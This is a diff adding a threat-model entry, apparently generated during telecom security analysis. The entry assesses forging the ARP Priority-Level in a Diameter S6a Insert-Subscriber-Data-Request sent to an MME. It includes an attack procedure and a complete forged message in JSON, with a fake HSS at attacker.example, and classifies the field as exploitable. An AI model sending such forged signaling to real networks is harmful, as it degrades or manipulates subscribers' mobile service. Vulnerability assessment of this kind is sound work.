@@ -1,0 +1,84 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - On S6a, the normal sender of an Insert-Subscriber-Data-Request is the HSS and the victim receiver is the MME. Under the assumed misconfiguration, an Internet attacker can impersonate the HSS, open a Diameter connection to the MME, and send a forged IDR for a known subscriber so that the MME accepts it as authoritative subscription data.
+
+- **Attacker Capability:**
+  - The attacker can only send crafted Diameter Requests on its own unauthenticated connection and receive the corresponding Answers. It cannot observe or alter legitimate HSS-MME signaling and has no extra NAS/GTP/radio capabilities. The only question is whether changing `Subscription-Data.APN-Configuration-Profile.APN-Configuration.EPS-Subscribed-QoS-Profile.Allocation-Retention-Priority.Priority-Level` itself creates a concrete additional effect.
+
+### **Exploitability Analysis:**
+- The target field is a 3GPP subscriber-provisioning value inside `Allocation-Retention-Priority` of an `EPS-Subscribed-QoS-Profile` under an APN configuration delivered by IDR. It is authoritative HSS-originated subscription data, and the MME is expected to store or refresh it in the UE's cached APN profile.
+
+- Changing this field specifically changes the subscribed ARP priority level for the affected APN/bearer context. That is a real control input: lower numeric values increase bearer admission/retention priority, higher numeric values reduce it. The MME can later reuse this stored value during default or dedicated bearer handling and propagate the resulting QoS context into downstream bearer-control signaling.
+
+- However, the concrete effect of `Priority-Level` is narrow and conditional. It does not directly select an APN, change authentication, alter routing, or force immediate detach/attach failure. Its effect is typically realized only later, when bearer establishment/modification occurs and only when admission/pre-emption pressure exists. On an uncongested system, changing only this field may have no visible result at all. Practical impact also depends on the rest of the ARP tuple, especially `Pre-emption-Capability` and `Pre-emption-Vulnerability`.
+
+- Under the required field-specific test, this is still enough to count as exploitability: the field is not mere metadata, and changing it can poison subscriber state in the MME so that later bearer admission/retention behavior for that subscriber is materially different. A forged high numeric `Priority-Level` can reduce the chance that the subscriber's bearer is admitted or retained under contention; a forged low numeric value can improperly elevate priority and potentially displace other bearers if pre-emption settings permit. That is a field-driven policy/QoS change, not just generic harm from accepting an IDR.
+
+- The impact is not maximally deterministic, and later legitimate HSS downloads can overwrite it, but the field itself remains a meaningful control point because it alters stored subscriber QoS policy consumed by later network procedures.
+
+### **Attack Procedure:**
+- Craft a forged S6a `Insert-Subscriber-Data-Request` from the attacker-controlled fake HSS to the victim MME, identifying the target subscriber and including `Subscription-Data` with a coherent `APN-Configuration-Profile`.
+- Inside the intended `APN-Configuration` instance, include `EPS-Subscribed-QoS-Profile` and `Allocation-Retention-Priority`, then set `Priority-Level` to a malicious value such as `15` to minimize admission priority for that APN's bearer.
+- Include the grouped ancestors and semantically necessary sibling AVPs so the APN configuration is acceptable: context identifiers, APN/service selection, PDN type, QCI, and the ARP pre-emption flags.
+- Expected success condition: the MME accepts the IDR and updates cached subscriber APN/QoS data; later bearer establishment or retention for that subscriber on the affected APN shows degraded admission/pre-emption behavior under load.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "version": 1,
+    "flags": ["Request", "Proxiable"],
+    "command_code": 319,
+    "application_id": 16777251,
+    "hop_by_hop_id": "0x10000001",
+    "end_to_end_id": "0x20000001"
+  },
+  "avps": [
+    { "name": "Session-Id", "value": "attacker.example;1234567890" },
+    { "name": "Auth-Session-State", "value": 1 },
+    { "name": "Origin-Host", "value": "fake-hss.attacker.example" },
+    { "name": "Origin-Realm", "value": "attacker.example" },
+    { "name": "Destination-Host", "value": "mme01.epc.example.net" },
+    { "name": "Destination-Realm", "value": "epc.example.net" },
+    {
+      "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    { "name": "User-Name", "value": "001010123456789" },
+    {
+      "name": "Subscription-Data",
+      "value": {
+        "APN-Configuration-Profile": {
+          "Context-Identifier": 1,
+          "All-APN-Configurations-Included-Indicator": 0,
+          "APN-Configuration": [
+            {
+              "Context-Identifier": 1,
+              "PDN-Type": 0,
+              "Service-Selection": "internet",
+              "AMBR": {
+                "Max-Requested-Bandwidth-UL": 1000000,
+                "Max-Requested-Bandwidth-DL": 1000000
+              },
+              "EPS-Subscribed-QoS-Profile": {
+                "QoS-Class-Identifier": 9,
+                "Allocation-Retention-Priority": {
+                  "Priority-Level": 15,
+                  "Pre-emption-Capability": 1,
+                  "Pre-emption-Vulnerability": 0
+                }
+              }
+            }
+          ]
+        }
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
